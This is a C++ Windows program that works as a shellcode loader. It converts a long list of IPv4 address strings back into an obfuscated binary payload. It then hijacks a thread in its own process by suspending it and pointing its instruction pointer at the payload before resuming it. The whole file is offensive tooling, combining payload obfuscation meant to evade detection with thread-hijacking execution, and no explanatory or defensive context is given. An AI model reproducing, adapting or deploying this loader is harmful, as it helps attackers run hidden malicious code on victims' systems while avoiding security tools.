#include <windows.h>
#include <iostream>
#include <vector>
#include <sstream>
#include <TlHelp32.h>

BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
    DWORD           dwProcessId = GetCurrentProcessId();
    HANDLE          hSnapShot = NULL;
    THREADENTRY32   Thr = { 0 };
    Thr.dwSize = sizeof(THREADENTRY32);

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!Thread32First(hSnapShot, &Thr)) {
        printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
        if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {
            HANDLE hTmp = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
            if (hTmp != NULL) {
                std::cout << Thr.th32ThreadID;
                *dwThreadId = Thr.th32ThreadID;
                *hThread = hTmp;
                break;
            }
            else {
                printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
            }
        }
    } while (Thread32Next(hSnapShot, &Thr));

    CloseHandle(hSnapShot);

    return (*dwThreadId != 0 && *hThread != NULL);
}


void HijackThread(HANDLE hThread, PVOID pAddress) {

    CONTEXT ThreadCtx;
    ThreadCtx.ContextFlags = CONTEXT_CONTROL;

    SuspendThread(hThread);

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
       
    }

    ThreadCtx.Rip = (DWORD64)pAddress;
    std::cout << "[+] Setting RIP to: " << std::hex << ThreadCtx.Rip << std::endl;
    

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());

    }

    printf("\t[#] Press <Enter> To Run ... ");
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);


}

std::vector<unsigned char> ipAddressesToBytes(const std::vector<std::string>& ipAddresses) {
    std::vector<unsigned char> byteArray;

    for (const auto& ip : ipAddresses) {
        std::stringstream ss(ip);
        std::string segment;
        while (getline(ss, segment, '.')) {
            int byteValue = stoi(segment);
            byteArray.push_back(static_cast<unsigned char>(byteValue));
        }
    }

    return byteArray;
}



int main() {
    

    std::vector < std::string > ipAddresses = {
        "72.49.201.72", "129.233.156.255", "255.255.72.141", "5.239.255.255", "255.72.187.184", "187.149.230.30", "170.135.146.72", "49.88.39.72",
        "45.248.255.255", "255.226.244.68", "243.22.2.238", "66.75.146.184", "187.212.183.95", "250.213.195.240", "138.71.176.123", "226.12.192.216",
        "243.30.180.6", "226.12.192.152", "243.30.148.78", "226.136.37.242", "241.216.215.215", "226.182.82.20", "135.244.154.28", "134.167.211.121",
        "114.152.167.31", "107.101.127.234", "243.30.180.62", "33.197.174.240", "186.69.167.79", "204.6.234.160", "176.151.233.155", "216.135.146.184",
        "48.21.110.30", "170.135.218.61", "123.225.129.86", "171.87.25.240", "163.209.109.94", "138.206.147.104", "235.118.176.83", "155.78.218.71",
        "114.212.109.42", "34.207.147.110", "243.164.38.95", "107.78.159.20", "250.148.39.38", "74.242.99.244", "184.217.194.22", "239.190.67.205",
        "99.205.162.149", "234.163.219.185", "107.243.167.149", "166.207.214.51", "251.137.175.31", "122.198.25.188", "51.221.231.206", "235.223.211.224",
        "229.204.188.95", "242.198.203.249", "225.221.101.242", "138.198.192.71", "91.205.167.71", "240.207.25.170", "82.222.25.225", "85.218.218.137",
        "96.198.175.160", "221.238.252.209", "213.240.146.30", "235.209.218.49", "90.220.33.220", "230.240.180.191", "68.64.181.77", "66.214.146.184",
        "187.216.137.100", "195.235.254.217", "148.160.200.46", "138.175.197.209", "213.241.137.105", "217.167.220.236", "155.164.214.48", "154.188.178.239",
        "210.251.208.42", "145.167.234.142", "143.174.198.108", "220.189.163.139", "136.187.214.55", "138.192.247.219", "208.250.201.44", "154.182.162.136",
        "138.165.215.62", "236.238.224.221", "221.250.158.49", "155.180.161.150", "139.149.191.77", "240.202.163.120", "246.164.47.77", "249.206.40.130",
        "237.236.65.30", "170.135.146.71", "110.125.246.30", "170.135.163.129", "137.187.215.40", "146.169.160.137", "138.187.212.46", "154.135.200.240",
        "50.84.175.217", "106.219.131.184", "187.216.215.215", "249.212.248.187", "232.220.92.73", "35.24.84.184", "187.149.230.225", "127.111.80.184",
        "187.149.201.121", "222.212.248.139", "136.166.158.73", "254.196.214.245", "212.220.145.40", "153.244.241.231", "250.254.209.113", "219.221.215.142",
        "255.230.214.102", "249.176.234.207", "212.241.142.115", "231.235.226.255", "239.164.183.73", "147.202.166.241", "249.162.160.88", "243.221.250.142",
        "216.222.175.102", "255.225.229.219", "245.166.212.112", "221.214.230.249", "237.167.149.82", "250.241.215.213", "241.205.171.73", "252.214.240.249",
        "200.164.176.46", "222.241.255.253", "212.247.142.113", "224.211.197.250", "227.217.161.65", "251.228.216.253", "140.209.165.47", "218.209.227.209",
        "238.184.172.39", "158.177.247.210", "213.242.178.81", "253.183.202.249", "217.161.203.46", "222.207.243.214", "208.204.160.120", "219.178.220.210",
        "232.248.159.41", "219.255.167.223", "204.225.132.118", "255.244.227.222", "249.207.133.89", "154.241.170.231", "232.222.129.108", "159.242.224.140",
        "241.192.181.30", "226.14.83.235", "225.212.190.83", "155.78.193.240", "3.149.228.54", "46.135.146.184", "187.197.181.77", "227.64.80.83",
        "238.187.221.225", "127.207.27.126", "209.159.185.77", "240.207.27.73", "246.164.47.83", "155.78.193.235", "242.82.36.51", "172.159.233.71",
        "110.16.38.107", "181.207.85.121", "51.134.230.30", "227.61.214.72", "142.117.230.30", "170.135.109.109", "243.106.41.106", "168.108.94.80",
        "238.149.230.30", "249.222.248.248", "225.220.111.207", "107.101.130.241", "124.85.230.14", "170.135.219.2", "227.49.181.251", "170.135.146.184",
        "68.64.174.141", "249.212.218.49", "92.221.111.239", "226.14.72.241", "124.85.230.62", "170.135.219.49", "66.220.92.12", "60.14.112.184",
        "187.149.230.225", "127.207.17.124", "155.16.38.106", "24.225.25.191", "243.148.37.155", "106.242.64.224", "120.205.140.30", "243.206.85.122",
        "75.32.68.72", "85.82.146.0"
    };


    auto byteArray = ipAddressesToBytes(ipAddresses);
    size_t byteVarSize = byteArray.size();

    unsigned char* byteVar = new unsigned char[byteArray.size()];

    for (size_t i = 0; i < byteVarSize; ++i) {
        byteVar[i] = byteArray[i];
    }
    

    DWORD dwMainThreadId = GetCurrentThreadId();
    DWORD dwThreadId = 0;
    HANDLE hThread = NULL;
    if (GetLocalThreadHandle(dwMainThreadId, &dwThreadId, &hThread)) {
        HijackThread(hThread, byteVar);
           
        
    }

    return 0;

}

